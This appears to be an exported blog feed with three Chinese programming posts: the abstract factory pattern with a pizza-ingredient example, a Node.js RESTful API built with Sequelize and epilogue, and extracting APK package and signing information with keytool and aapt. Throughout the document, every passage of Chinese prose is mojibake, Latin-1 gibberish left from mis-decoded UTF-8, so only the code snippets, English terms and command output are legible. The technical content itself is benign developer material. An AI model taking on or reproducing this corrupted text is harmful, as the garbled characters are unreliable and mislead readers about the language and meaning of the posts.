æŠ½è±¡å·¥å» ç”¨ä¸€å€‹æŠ½è±¡å·¥å» ä¾†å®šç¾©ä¸€å€‹å‰µå»º ç”¢å“æ— çš„ä»‹é¢ï¼Œç”¢å“æ—è£¡é¢æ¯å€‹ç”¢å“çš„å…·é«”é¡åˆ¥ç”±ç¹¼æ‰¿æŠ½è±¡å·¥å» çš„å¯¦é«”å·¥å» æ±ºå®šã€‚
ä¸Šé¢é‚£å¥è©±è«‹å‹™å¿…è®€æ‡‚ä»–
çµæ§‹

AbstractFactoryï¼ˆPizzaIngredientFactoryï¼‰: å®£å‘Šå‡ºå„å€‹å‰µå»ºåŒä¸€ç”¢å“æ—ç”¢å“çš„ä»‹é¢ã€‚

ConcreteFactoryï¼ˆNYPizzaIngredientFactoryï¼‰: å¯¦ä½œ AbstractFactoryã€‚

AbstractProductï¼ˆDoughï¼‰: å®£å‘Šç”¢å“ç­‰ç´šçµæ§‹çš„ç‰©å“ä»‹é¢ã€‚

Productï¼ˆThickCrustDoughï¼‰: ConcreteFactory æ‰€å»ºæ§‹çš„æˆå“ï¼Œéœ€è¦å¯¦ä½œ AbstractProductã€‚


å„ªç¼ºé»1.ä¸€æ¨£å€éš”äº†æ¯å€‹ç”¢å“çš„ç”Ÿæˆå’Œä½¿ç”¨ï¼Œclient è¢«éš”é›¢åœ¨ç”¢å“çš„ class ä¹‹å¤–ã€‚client ç”šè‡³ä¸çŸ¥é“ä»€éº¼ç”¢å“è¢«å‰µå»ºäº†ã€‚ä»–åªè¦çŸ¥é“é‚£å€‹ç”¢å“æœ‰å“ªäº›å‡½æ•¸å¯ä»¥çµ¦ä»– callï¼Œé€™å€‹ç‰¹é»ä½¿å¾—æŠ½æ›å…·é«”å·¥å» é€™ä»¶äº‹è®Šå¾—éå¸¸å®¹æ˜“ã€‚
2.æ€§è³ªé¡ä¼¼çš„ç”¢å“é›†ä¸­ç®¡ç†ï¼ˆæ‰€æœ‰ NY çš„åŸæ–™ä¸€èµ·ç®¡ç†ï¼Œæˆ–æ˜¯æ‰€æœ‰æ—¥å¼çš„å‚¢ä¿±ä¸€èµ·ç®¡ç†ï¼‰ã€‚ä»Šå¤©æœ‰æ–°çš„å·¥å» è¦é€²ä¾†ï¼Œä»–éœ€è¦ implement çš„ method éå¸¸æ˜ç¢ºï¼Œç…§è‘— AbstractFactory å®šç¾©çš„ä»‹é¢å¯¦ä½œå°±å°äº†ã€‚æŸç¨®ç¨‹åº¦è€Œè¨€ä¹Ÿç®—æ˜¯çµ¦ client æ–¹ä¾¿ï¼Œæˆ‘ä¿è­‰ä»–åªæœƒç”¨åˆ°åŒä¸€å€‹ç”¢å“æ—çš„å°è±¡ã€‚
3.ç¼ºé»éå¸¸è‡´å‘½ï¼Œå°±æ˜¯ç•¶æˆ‘æƒ³åœ¨ç”¢å“æ—åŠ ä¸€å€‹ç”¢å“éå¸¸å›°é›£ã€‚å› ç‚ºæˆ‘æ‰€æœ‰å­å·¥å» è¦è·Ÿè‘—æ”¹ï¼Œé€™è¢«ç¨±ç‚ºé–‹é–‰åŸå‰‡çš„å‚¾æ–œæ€§ï¼šæ–°å¢ç”¢å“æ—å®¹æ˜“ï¼Œä½†æ–°å¢ç”¢å“çµæ§‹å›°é›£ã€‚
ä½¿ç”¨æ™‚æ©Ÿ1.ä¸€å€‹ç³»çµ±å¿…é ˆå’Œç”¢å“çš„ç”Ÿæˆ&#x2F;çµ„åˆï¼Œä¿æŒç¨ç«‹ã€‚
2.è¨±å¤šé¡ä¼¼çš„ç”¢å“å¯ä»¥çµ„æˆç”¢å“æ—ï¼Œæ–¹ä¾¿é›†ä¸­ç®¡ç†ï¼Œè€Œä¸”å¤šæ–¼ä¸€å€‹çš„ç”¢å“æ—ã€‚
3.åªæƒ³å…¬é–‹ç”¢å“ interface ä¸æƒ³å…¬é–‹å¯¦ä½œç´°ç¯€ã€‚
ç´°èªªæŠ½è±¡å·¥å» æº–å‚™å¥½è±æ”¶èæœƒè²«é€šçš„æœå¯¦äº†å—ï¼ŸGoï¼
1.æŠ½è±¡å·¥å» å®šç¾©äº†éœ€è¦å‰µå»ºçš„ç”¢å“æ—ï¼Œç”± concreteFactory å»å¯¦ä½œæŠ½è±¡å·¥å» ï¼Œæ‰€ä»¥é€šå¸¸æŠ½è±¡å·¥å» è£¡çš„æ¯ä¸€å€‹å‰µå»º product çš„æŠ½è±¡æ–¹æ³•ï¼Œéƒ½æ˜¯ç”¨å·¥å» æ–¹æ³•ï¼Œç”±ç¹¼æ‰¿çš„å…·é«”å·¥å» ä¾†å¯¦ç¾ï¼Œé€™ä¹Ÿæ˜¯é€™å…©å€‹åè©å¸¸è¢«ææ··çš„åŸå› ã€‚
2 . 

ç”±æ­¤åœ–å¯ä»¥çœ‹å¾—å‡ºä¾†ï¼Œå¦‚æœæˆ‘å€‘ç”¨æŠ½è±¡å·¥å» ä¾†å¯¦ä½œ pizza åº—ï¼Œæˆ‘å€‘åªéœ€è¦å¯¦ä½œ2å€‹å·¥å» ï¼ˆChicagoPizzaIngredientFactoryã€NYPizzaIngredientFactoryï¼‰ï¼Œä½†å¦‚æœæˆ‘å€‘ç”¨å·¥å» æ–¹æ³•ä¾†å¯¦ä½œï¼Œæˆ‘å€‘éœ€è¦å¯¦ä½œ8å€‹å·¥å» ã€‚
æ‰€ä»¥ç•¶ä½ ç™¼ç¾ä½ çš„å·¥å» æ–¹æ³•å€‘ï¼Œéµå¾ªè‘—ä¸€å€‹ç”¢å“æ—çš„ patternï¼Œè©¦è‘—æŠŠé€™ç”¢å“æ—åˆ†é›¢å‡ºä¾†å¯«ç¨±æŠ½è±¡å·¥å» çš„ interfaceï¼Œç„¶å¾Œç”¨å…·é«”å·¥å» å¯¦ç¾ã€‚é€™å°±æ˜¯ Design Pattern rule #2: Program to an interface, not an implementationã€‚
3.é€€åŒ–æˆå·¥å» æ¨¡å¼
å¦‚æœä½ çš„æŠ½è±¡å·¥å» è£¡å®šç¾©çš„å‰µå»ºæ–¹æ³•åªæœ‰ä¸€å€‹ï¼ˆåªæœ‰ä¸€å€‹ç”¢å“ç­‰ç´šçµæ§‹ï¼‰ï¼Œé‚£ä½ çš„æŠ½è±¡å·¥å» å°±é€€åŒ–æˆå·¥å» æ–¹æ³•ã€‚ä½ æŠŠä¸Šåœ–çš„ Dough æ”¹æˆ Pizzaï¼Œå°±æ˜¯å‰åŠæ®µå·¥å» æ–¹æ³•åœ¨èªªçš„æ±è¥¿
4.é€€åŒ–æˆç°¡å–®å·¥å» æ¨¡å¼
å¦‚æœä½ åªæœ‰ä¸€å€‹å…·é«”å·¥å» å› ç‚ºæ¯å€‹é…æ–™åªæœ‰ä¸€å€‹å¯¦ä½œï¼Œæ‰€ä»¥æ²’æœ‰ä½¿ç”¨ interface çš„å¿…è¦ï¼Œä½ æŠŠä¸Šåœ–çš„å„å€‹é…æ–™æ”¹æˆå„å€‹ pizzaï¼Œå°±æ˜¯ä¸Šä¸€ç¯‡çš„ç°¡å–®å·¥å» æ¨¡å¼çš„ä¾‹å­ã€‚
ç¸½çµåªæœ‰ç°¡å–®å·¥å» è·ŸæŠ½è±¡å·¥å» ï¼ŒçœŸçš„éœ€è¦å¯¦ä½œå·¥å» ã€‚
å·¥å» æ–¹æ³•æŒ‡çš„æ˜¯ä¸€å€‹æ–¹æ³•ï¼Œé€™å€‹æ–¹æ³•è² è²¬å‰µé€ æ±è¥¿ï¼Œä¸”äº¤ç”±å­é¡åˆ¥è² è²¬ç¹¼æ‰¿ã€‚
å»¶ä¼¸é–±è®€
Design Pattern(3) - è£é£¾è€…æ¨¡å¼
Design Pattern(2) - è§€å¯Ÿè€…æ¨¡å¼
Design Pattern(1) - ç­–ç•¥æ¨¡å¼

é—œæ–¼ä½œè€…ï¼š@jyt0532 å¾Œç«¯å·¥ç¨‹å¸«ï¼Œå–œæ­¡å­¸ç¿’æ–°çŸ¥æŒ‘æˆ°æ–°äº‹ç‰©ï¼Œæœ€è¿‘è¦ºå¾— Anti pattern æ¯” Design pattern æœ‰è¶£ã€‚
]]></content>
      <tags>
        <tag>design pattern</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ Node.js å¿«é€Ÿæ‰“é€  RESTful API</title>
    <url>/2016/04/23/fast-restful-nodejs-api-backend/</url>
    <content><![CDATA[å‰è¨€ç¾ä»Šæœ‰äº›ç¶²ç«™æ¡ç”¨äº† Single Page Application çš„æ–¹æ¡ˆï¼Œå¾Œç«¯åªè² è²¬æä¾› API è®“å‰ç«¯æŠ“å–è³‡æ–™ï¼Œé”æˆå®Œå…¨çš„å‰å¾Œç«¯åˆ†é›¢ã€‚å‰ç«¯çš„é¸æ“‡æœ‰å¾ˆå¤šç¨®ï¼Œä½ å¯ä»¥ç”¨ Angularï¼Œå¯ä»¥ç”¨ Ember.jsï¼Œä¹Ÿå¯ä»¥ç”¨ React + Reduxã€‚è‡³æ–¼å¾Œç«¯çš„ APIï¼Œå¿…é ˆç¬¦åˆå›ºå®šæ ¼å¼ï¼Œæ‰èƒ½è®“å‰ç«¯çš„äººå“¡æ¯”è¼ƒå¥½æŠ“å–ã€‚è€Œé€™å€‹ã€Œå›ºå®šæ ¼å¼ã€ï¼Œæœ€å¸¸è¦‹çš„å°±æ˜¯æˆ‘å€‘ä»Šå¤©çš„é‡é»ï¼šRESTfulã€‚
ä»€éº¼æ˜¯ RESTfulï¼Ÿèˆ‡èµ·å¾ç¡¬ç”Ÿç”Ÿçš„æ–‡å­—è§£é‡‹ä¸‹æ‰‹ï¼Œä¸å¦‚å…ˆå¾å¯¦éš›ç¯„ä¾‹è‘—æ‰‹ã€‚å‡è¨­ç¾åœ¨ä½ è¦å¯«ä¸€å€‹éƒ¨è½æ ¼ç¶²ç«™çš„å¾Œç«¯ APIï¼Œåå€‹äººå¯èƒ½æœƒæœ‰åç¨®å¯«æ³•ï¼›ä¾‹å¦‚èªªã€ŒæŠ“å–æ‰€æœ‰æ–‡ç« ã€é€™å€‹åŠŸèƒ½ï¼š

&#x2F;api&#x2F;blog&#x2F;getList
&#x2F;api&#x2F;blog&#x2F;getAllArticle
&#x2F;api&#x2F;blog&#x2F;article&#x2F;getAll
&#x2F;api&#x2F;blog&#x2F;fetchAll
&#x2F;api&#x2F;blog&#x2F;all

ä½†å¦‚æœæ˜¯æ¡å– RESTful çš„æ–¹æ¡ˆï¼Œå°±æœƒç¬¦åˆä¸€å®šçš„æ ¼å¼ï¼š



æ“ä½œ
Method
URL



æ‰€æœ‰æ–‡ç« 
GET
&#x2F;api&#x2F;posts


å–®ä¸€æ–‡ç« 
GET
&#x2F;api&#x2F;posts&#x2F;:id


æ–°å¢æ–‡ç« 
POST
&#x2F;api&#x2F;posts


åˆªé™¤æ–‡ç« 
DELETE
&#x2F;api&#x2F;posts&#x2F;:id


ä¿®æ”¹æ–‡ç« 
PUT&#x2F;PATCH
&#x2F;api&#x2F;posts&#x2F;:id


åœ¨é€™å€‹ä¾‹å­è£¡ï¼Œæ–‡ç« ï¼ˆpostsï¼‰æ˜¯ä¸€å€‹ Resourceï¼Œä½ å¯ä»¥é€é HTTP æä¾›çš„å¹¾ç¨®æ–¹æ³•æ­é…ä¸åŒçš„ URL å­˜å–é€™å€‹ Resourceã€‚
å¦‚æœä½ å° RESTful å¾ˆæœ‰èˆˆè¶£ï¼Œé€™é‚Šæ˜¯ä¸€äº›å€¼å¾—åƒè€ƒçš„æ–‡ç« ï¼š

ä»€éº¼æ˜¯RESTè·ŸRESTful?
æ·ºè«‡ REST è»Ÿé«”æ¶æ§‹é¢¨æ ¼
ç†è§£RESTfulæ¶æ§‹

ORMORM çš„å…¨ç¨±æ˜¯ï¼šObject Relational Mappingå¦‚æœä»¥è³‡æ–™åº«ä¾†èªªçš„è©±ï¼Œå°±æ˜¯æŠŠä½ çš„è³‡æ–™åº«å°æ‡‰åˆ°ç¨‹å¼è£¡çš„ç‰©ä»¶ã€‚èˆ‰ä¸Šé¢çš„éƒ¨è½æ ¼çš„ä¾‹å­ï¼Œä½ çš„è³‡æ–™åº« table å¯èƒ½æ˜¯é€™æ¨£ï¼š



æ¬„ä½
é¡å‹
èªªæ˜



id
int
id


title
text
æ¨™é¡Œ


content
text
å…§æ–‡


created_at
timestamp
å»ºç«‹æ™‚é–“


å°æ‡‰åˆ° Node.js è£¡é¢çš„ç‰©ä»¶ï¼Œä½ å¯ä»¥é€™æ¨£ï¼š
// å»ºç«‹æ–‡ç« Post.create(&#123;  title: &#x27;Hello Excel&#x27;,  content: &#x27;æ¸¬è©¦&#x27;&#125;)// åˆªé™¤ id ç‚º 1 çš„æ–‡ç« Post.find(1).delete();

ä¹Ÿå°±æ˜¯èªªï¼Œä½ ä»Šå¤©æ ¹æœ¬ä¸ç”¨ç®¡èƒŒå¾Œçš„è³‡æ–™åº«ç”¨çš„æ˜¯å“ªä¸€ç¨®ï¼Œä¹Ÿä¸ç”¨ç®¡ table çš„åç¨±åˆ°åº•æ˜¯ä»€éº¼ï¼Œä½ åªè¦å°ä½ çŸ¥é“çš„é€™å€‹ Post ç‰©ä»¶åšæ“ä½œå³å¯ã€‚
Sequelizeæ˜¯ä¸€å¥—å¾ˆå¥½ç”¨çš„ ORM Libraryï¼Œåªè¦å…ˆå®šç¾©å¥½ä¸€ä»½schemaï¼Œå°±å¯ä»¥å¹«ä½ æŠŠç‰©ä»¶è·Ÿè³‡æ–™åº«é—œé€£èµ·ä¾†ã€‚
ç‚ºä»€éº¼çªç„¶æåˆ° ORMï¼Ÿæœ‰äº›è®€è€…å¯èƒ½å·²ç¶“æƒ³åˆ°ï¼Œå…¶å¯¦ RESTful API è·Ÿ ORM ä¹‹é–“ï¼Œæ˜¯æœ‰æŸç¨®ç¨‹åº¦çš„é—œè¯çš„ã€‚æ€éº¼èªªå‘¢ï¼Ÿ  
å‡è¨­æˆ‘ä»Šå¤©è¦å¯«ä¸€å€‹ç•™è¨€æ¿çš„å¾Œç«¯ APIï¼Œè€Œä¸”æˆ‘åˆåŒæ™‚æ¡ç”¨ RESTful è·Ÿ ORMï¼Œæˆ‘çš„ç¨‹å¼å°±æœƒé•·é€™æ¨£ï¼š
// æŠ“å–æ‰€æœ‰ç•™è¨€// GET /api/messagesMessage.findAll();// æŠ“å–å–®ä¸€ç•™è¨€// GET /api/messages/:idMessage.find(id);// æ–°å¢ç•™è¨€// POST /api/messagesMessages.create(&#123;  content: content&#125;)// åˆªé™¤ç•™è¨€// DELETE /api/messages/:idMessages.find(id).delete();// ä¿®æ”¹ç•™è¨€// PUT /api/messages/:idMessages.find(id).update(&#123;  content: new_content&#125;)

é‚£å¦‚æœæˆ‘ä»Šå¤©æ˜¯å¯«ä¸€å€‹éƒ¨è½æ ¼çš„å¾Œç«¯ API å‘¢ï¼ŸæŠŠä¸Šé¢çš„ messages å…¨éƒ¨æ›æˆ postsï¼Œæå®šï¼å¾ä»¥ä¸Šä¾‹å­å¯ä»¥çœ‹å‡ºï¼Œå…¶å¯¦é€™å…©æ¨£æ±è¥¿æ˜¯å¾ˆé©åˆæ­é…åœ¨ä¸€èµ·çš„ï¼Œå› ç‚ºå…©å€‹éƒ½èƒ½å¤ ç¬¦åˆå·®ä¸å¤šçš„è¦å‰‡ã€‚
å…©å€‹é¡˜æœ›ä¸€æ¬¡æ»¿è¶³ï¼Œepilogueepilogue æ˜¯ä¸€å¥— Node.js çš„ Libraryï¼Œå®ƒçµåˆäº† Sequelize è·Ÿ Expressï¼Œä¸»è¦ç›®çš„å°±æ˜¯è®“æˆ‘å€‘èƒ½å¿«é€Ÿæ‰“é€ å‡º RESTful çš„ APIã€‚
è®“æˆ‘å€‘ç›´æ¥ä¾†çœ‹çœ‹å®˜ç¶²çš„ç¯„ä¾‹ï¼š
é¦–å…ˆï¼Œä½ è¦å…ˆå®šç¾©å¥½çš„è³‡æ–™åº«ï¼Œè·Ÿä½ çš„ schema
var database = new Sequelize(&#x27;database&#x27;, &#x27;root&#x27;, &#x27;password&#x27;);var User = database.define(&#x27;User&#x27;, &#123;  username: Sequelize.STRING,  birthday: Sequelize.DATE&#125;);

å†ä¾†ï¼Œåˆå§‹åŒ– express è·Ÿ epilogue
var express = require(&#x27;express&#x27;),    bodyParser = require(&#x27;body-parser&#x27;);var app = express();app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended: false &#125;));server = http.createServer(app);epilogue.initialize(&#123;	app: app,	sequelize: database&#125;);

æœ€å¾Œï¼Œé  epilogue æŠŠ url è·Ÿè³‡æ–™åº«é—œé€£èµ·ä¾†ï¼Œä½ è¦æä¾›å®ƒä½ æƒ³è¦çš„ endpoint è·Ÿè¦é—œé€£çš„ model
var userResource = epilogue.resource(&#123;  model: User,  endpoints: [&#x27;/users&#x27;, &#x27;/users/:id&#x27;]&#125;);

å°±æ˜¯é€™æ¨£ç°¡å–®ä¸‰å€‹æ­¥é©Ÿï¼Œä½ å°±æœ‰äº†ä¸€å€‹ RESTful APIï¼æ˜¯ä¸æ˜¯å¾ˆç°¡å–®å‘¢ï¼Ÿ
é‚„ä¸åªé€™æ¨£åœ¨å¯¦éš›çš„é–‹ç™¼éç¨‹ä¸­ï¼Œå…¶å¯¦å¾€å¾€æ²’æœ‰é‚£éº¼é †åˆ©ï¼Œä¾‹å¦‚èªªä½ çš„å›å‚³æ ¼å¼å¯èƒ½è·Ÿè³‡æ–™åº«çš„æ ¼å¼ä¸ä¸€æ¨£ï¼Œæˆ–æ˜¯ä½ çš„æŸäº› API éœ€è¦ç¶“éèªè­‰æ‰èƒ½å‘¼å«ã€‚æ²’é—œä¿‚ï¼Œepilogue éƒ½å¹«ä½ æƒ³å¥½äº†ã€‚
epilogue æä¾›äº†ä¸ƒç¨®è¡Œç‚ºçš„ hookï¼ŒåŒ…æ‹¬ start, auth, fetch, data, write, send, completeï¼Œå†æ­é…ä¸Š before, action, after ä¸‰ç¨®ï¼Œä½ å¯ä»¥åœ¨ä»»ä½•ä¸€å€‹éšæ®µåšä½ æƒ³åšçš„äº‹æƒ…ã€‚
ä¾‹å¦‚èªªä½ æƒ³åœ¨å‚³å›çµæœä¹‹å‰åšä¸€é»å°å°çš„è®Šæ›´ï¼Œå°±æ˜¯userResource.list.send.beforeï¼Œæˆ–æ˜¯ä½ å¯èƒ½æƒ³å°æŸå€‹ API åšé©—è­‰ï¼Œé‚£å°±æ˜¯userResource.delete.authã€‚
é€™é‚Šæä¾›å…©å€‹å®˜ç¶²çš„å®Œæ•´ç¯„ä¾‹ï¼š
// ç¦æ­¢åˆªé™¤ useruserResource.delete.auth(function(req, res, context) &#123;  throw new ForbiddenError(&quot;can&#x27;t delete a user&quot;);&#125;)// å…ˆçœ‹æœ‰æ²’æœ‰ cacheï¼Œæœ‰çš„è©±ç›´æ¥è¿”å› cache çš„å…§å®¹userResource.list.fetch.before(function(req, res, context) &#123;  var instance = cache.get(context.criteria);  if (instance) &#123;    // keep a reference to the instance and skip the fetch    context.instance = instance;    return context.skip;  &#125; else &#123;    // cache miss; we continue on    return context.continue;  &#125;&#125;)

ç¸½çµè‹¥æ˜¯ä½ çš„å¾Œç«¯ API æ²’æœ‰å¾ˆè¤‡é›œï¼Œéƒ½æ˜¯åŸºæœ¬çš„ CRUD çš„è©±ï¼Œé‚£ epilogue çµ•å°æ˜¯å¾ˆé©åˆä½ çš„ä¸€å¥—æ¡†æ¶ï¼Œåªè¦ä½ æŠŠè³‡æ–™åº«çš„ schema é–‹å‡ºä¾†ï¼Œç¨‹å¼ç¢¼è¤‡è£½è²¼ä¸Šä¸€ä¸‹å°±èƒ½å¤ å®Œæˆä¸€å€‹ APIã€‚è‹¥æ˜¯è®€è€…ä¹‹å¾Œæœ‰ç›¸é—œçš„éœ€æ±‚ï¼Œä¸å¦¨è©¦è©¦çœ‹å§ï¼
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>Nodejs</tag>
        <tag>RESTful</tag>
        <tag>epilogue</tag>
        <tag>Sequelize</tag>
        <tag>Express</tag>
      </tags>
  </entry>
  <entry>
    <title>å¿«é€Ÿå–å¾— apk ç›¸é—œè³‡è¨Š</title>
    <url>/2016/05/20/fast-way-to-get-apk-information/</url>
    <content><![CDATA[å‰è¨€åœ¨ ä¹‹å‰ï¼Œæˆ‘å€‘æ›¾ç¶“ä»‹ç´¹éå¦‚ä½•åç·¨è­¯ Android Apkã€‚è€Œè—‰ç”±åç·¨è­¯ï¼Œæˆ‘å€‘å¯ä»¥çŸ¥é“è¨±å¤šè·Ÿ apk æœ‰é—œçš„è³‡è¨Šï¼Œä¾‹å¦‚èªª AndroidManifest.xmlï¼Œåªè¦é€™å€‹æª”æ¡ˆå°±å¯ä»¥çœ‹å‡º apk çš„ä¸€äº›åŸºæœ¬è³‡è¨Šï¼Œé‚„å¯ä»¥çœ‹åˆ°æ•´å€‹ apk çš„ç¨‹å¼ç¢¼è·Ÿä½¿ç”¨åˆ°çš„è³‡æºï¼ˆåœ–æª”ã€å½±ç‰‡ã€è²éŸ³ç­‰ç­‰ï¼‰ã€‚
ä½†è‹¥æ˜¯ä»Šå¤©æˆ‘å€‘åªæƒ³è¦çŸ¥é“åŸºæœ¬è³‡è¨Šï¼Œå®Œå…¨ä¸æƒ³çŸ¥é“ apk æ˜¯æ€éº¼å¯«çš„ï¼Œä¹Ÿæ ¹æœ¬ä¸é—œå¿ƒå®ƒç”¨åˆ°å“ªäº›è³‡æºï¼Œé‚£è©²æ€éº¼è¾¦å‘¢ï¼Ÿåç·¨è­¯éœ€è¦ä¸€é»æ™‚é–“ï¼Œæ„ˆå¤§çš„ apk éœ€è¦æ„ˆä¹…ï¼Œæœ‰æ²’æœ‰æ›´å¥½çš„æ–¹æ³•å‘¢ï¼Ÿ
éœ€è¦å“ªäº›è³‡è¨Šï¼Ÿé¦–å…ˆæˆ‘å€‘å…ˆä¾†å®šç¾©ä¸€ä¸‹ã€ŒåŸºæœ¬è³‡è¨Šã€æŒ‡çš„æ˜¯å“ªäº›ã€‚ä»¥æˆ‘ä¾†èªªï¼Œæˆ‘æƒ³å–å¾—çš„åŸºæœ¬è³‡è¨Šæœ‰ä»¥ä¸‹å…­é»ï¼š

package name
version code
version name
launch activity
Google SHA1 Fingerprint
Facebook Keyhash

å‰å››å€‹çš„ç”¨é€”åœ¨æ–¼ï¼Œå‡è¨­ä½ ä»Šå¤©åšäº†ä¸€å€‹å…¬å¸å…§éƒ¨çš„ apk ä¸Šæ¶ç³»çµ±ï¼Œå¦‚æœæœ‰äº†å‰å››é …è³‡è¨Šï¼Œå°±å¯ä»¥åšè·Ÿ Google Play ç›¸ä¼¼çš„é©—è­‰ï¼Œä¾‹å¦‚èªªé©—è­‰ package name è·Ÿä¸Šæ¬¡ä¸Šå‚³çš„æ˜¯å¦ä¸€æ¨£ã€ç‰ˆæœ¬è™Ÿæ˜¯å¦æ¯”ä¸Šä¸€æ¬¡çš„é«˜ç­‰ç­‰ã€‚
è‡³æ–¼å¾Œå…©å€‹å‘¢ï¼Ÿæœ‰ä¸²æ¥é Google è·Ÿ Facebook ç™»å…¥çš„è®€è€…å°±æœƒçŸ¥é“ï¼Œé€™å…©å€‹æ˜¯ä¸²ç™»å…¥æ™‚å¿…å‚™çš„æ±è¥¿ã€‚ä½ è¦åœ¨è¨­å®šè£¡é¢æ–°å¢é€™å…©çµ„ keyï¼Œæ‰èƒ½å¤ ä½¿ç”¨ç™»å…¥åŠŸèƒ½ï¼Œå¦å‰‡æœƒå‡ºç¾é©—è­‰éŒ¯èª¤ä¹‹é¡çš„å­—çœ¼ã€‚
çŸ¥é“æˆ‘å€‘éœ€è¦å“ªäº›ä»¥å¾Œï¼Œå°±ä¾†å‹•æ‰‹åšå§ï¼
å¥½ç”¨çš„ keytoolkeytool æ˜¯ç³»çµ±å…§å»ºï¼Œèˆ‡èªè­‰ç›¸é—œçš„æŒ‡ä»¤ã€‚æˆ‘å€‘å¯ä»¥ç”¨ keytool -list -printcert -jarfile NAME.apk æå–å‡ºä¸€äº›è³‡è¨Šï¼š
ç°½ç½²è€… #1:ç°½ç« :æ“æœ‰è€…: CN=Android Debug, O=Android, C=USç™¼å‡ºè€…: CN=Android Debug, O=Android, C=USåºè™Ÿ: 4b52355eæœ‰æ•ˆæœŸè‡ª: Sun Jan 17 05:53:34 CST 2010 åˆ°: Mon Jan 17 05:53:34 CST 2011æ†‘è­‰æŒ‡ç´‹:   MD5:  14:99:01:12:7A:69:CD:75:4F:31:75:8C:59:F6:71:63   SHA1: 24:69:FD:17:6B:C3:43:FC:3A:85:EC:4B:C5:D7:9F:09:4A:71:60:80   SHA256: 57:EB:73:81:D7:08:E6:45:FE:26:99:FB:3C:1F:37:1E:EE:38:39:20:E0:2D:C6:76:0E:84:2B:DD:1C:5C:C9:70   ç°½ç« æ¼”ç®—æ³•åç¨±: SHA1withRSA   ç‰ˆæœ¬: 3

ä»¥é€™å€‹ apk ä¾†èªªï¼Œåˆ—å‡ºäº†ï¼šæ“æœ‰è€…ã€ç™¼å‡ºè€…ã€æœ‰æ•ˆæœŸé™ã€æ†‘è­‰æŒ‡ç´‹ç­‰ç­‰çš„è³‡è¨Šï¼Œè€Œå…¶ä¸­çš„ SHA1 å°±æ˜¯ Google ç™»å…¥æœƒç”¨åˆ°çš„è³‡è¨Šã€‚
é‚£ Facebook Keyhash å‘¢ï¼Ÿå¾ å®˜æ–¹æ–‡ä»¶ å¯ä»¥çŸ¥é“ï¼Œå…¶å¯¦å°±åªæ˜¯æŠŠ sha1 å…ˆè®Šæˆ binary ç„¶å¾Œå†åš base64 è€Œå·²ã€‚
åªè¦æœ‰äº† sha1ï¼Œæ­é…ä¸€äº›æŒ‡ä»¤ï¼Œå°±å¯ä»¥å¾ˆç°¡å–®çš„ç”Ÿæˆ Facebook Keyhashã€‚
è¬èƒ½çš„ aaptaapt çš„å…¨åæ˜¯ï¼šAndroid Asset Packaging Toolï¼Œè¶…ç´šå¥½ç”¨ï¼å¯ä»¥å…ˆä¾†çœ‹çœ‹ aapt åˆ°åº•å¯ä»¥åšå“ªäº›äº‹æƒ…ç”±æ–¼æˆ‘å€‘éœ€è¦çš„æ˜¯å–å‡ºè³‡è¨Šï¼Œå› æ­¤ç›´æ¥çœ‹ dump çš„éƒ¨ä»½ï¼š
aapt d[ump] [--values] WHAT file.&#123;apk&#125; [asset [asset ...]]  badging          Print the label and icon for the app declared in APK.  permissions      Print the permissions from the APK.  resources        Print the resource table from the APK.  configurations   Print the configurations in the APK.  xmltree          Print the compiled xmls in the given assets.  xmlstrings       Print the strings of the given compiled xml assets.

æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥æ¯ä¸€å€‹éƒ½è©¦è©¦çœ‹ï¼Œçœ‹æœƒå‡ºç¾ä»€éº¼çµæœã€‚ä»¥æˆ‘å€‘çš„éœ€æ±‚ä¾†è¬›ï¼Œbadging æ˜¯æœ€ç¬¦åˆçš„
aapt dump badging NAME.apk
package: name=&#x27;com.gmail.aszx87410.movie_to_nine&#x27; versionCode=&#x27;1&#x27; versionName=&#x27;1.0&#x27;sdkVersion:&#x27;8&#x27;targetSdkVersion:&#x27;16&#x27;uses-permission:&#x27;android.permission.INTERNET&#x27;uses-gl-es:&#x27;0x20000&#x27;uses-feature-not-required:&#x27;android.hardware.telephony&#x27;uses-feature:&#x27;android.hardware.screen.portrait&#x27;uses-feature-not-required:&#x27;android.hardware.screen.landscape&#x27;application-label:&#x27;ä»Šæ™šä¹é»é›»å½±2.0&#x27;application-label-he:&#x27;ä»Šæ™šä¹é»é›»å½±2.0&#x27;application-label-es:&#x27;ä»Šæ™šä¹é»é›»å½±2.0&#x27;application-label-iw:&#x27;ä»Šæ™šä¹é»é›»å½±2.0&#x27;application-icon-120:&#x27;res/drawable-ldpi/icon.png&#x27;application-icon-160:&#x27;res/drawable-mdpi/icon.png&#x27;application-icon-240:&#x27;res/drawable-hdpi/icon.png&#x27;application-icon-320:&#x27;res/drawable-xhdpi/icon.png&#x27;application-icon-480:&#x27;res/drawable-xxhdpi/icon.png&#x27;application: label=&#x27;ä»Šæ™šä¹é»é›»å½±2.0&#x27; icon=&#x27;res/drawable-mdpi/icon.png&#x27;launchable-activity: name=&#x27;com.ansca.corona.CoronaActivity&#x27;  label=&#x27;ä»Šæ™šä¹é»é›»å½±2.0&#x27; icon=&#x27;&#x27;uses-feature:&#x27;android.hardware.touchscreen&#x27;uses-implied-feature:&#x27;android.hardware.touchscreen&#x27;,&#x27;assumed you require a touch screen unless explicitly made optional&#x27;mainother-activitiesother-receiversother-servicessupports-screens: &#x27;small&#x27; &#x27;normal&#x27; &#x27;large&#x27; &#x27;xlarge&#x27;supports-any-density: &#x27;true&#x27;locales: &#x27;--_--&#x27; &#x27;he&#x27; &#x27;es&#x27; &#x27;iw&#x27;densities: &#x27;120&#x27; &#x27;160&#x27; &#x27;240&#x27; &#x27;320&#x27; &#x27;480&#x27;native-code: &#x27;&#x27; &#x27;armeabi-v7a&#x27;

å°‡å°‡å°‡å°‡ï½æˆ‘å€‘æ‰€éœ€è¦çš„è³‡è¨Šå…¨éƒ¨å‡ºç¾åœ¨é€™è£¡äº†ï¼Œé‚„é™„å¸¶æ¬Šé™åˆ—è¡¨ã€app logoã€app åç¨±ç­‰ç­‰çš„è³‡è¨Šåšåˆ°é€™é‚Šï¼Œå…¨éƒ¨éœ€è¦çš„æ±è¥¿éƒ½æœ‰äº†ï¼Œå‰©ä¸‹å°±åªæ˜¯åˆ‡å‡ºå­—ä¸²èˆ‡æ•´åˆè€Œå·²
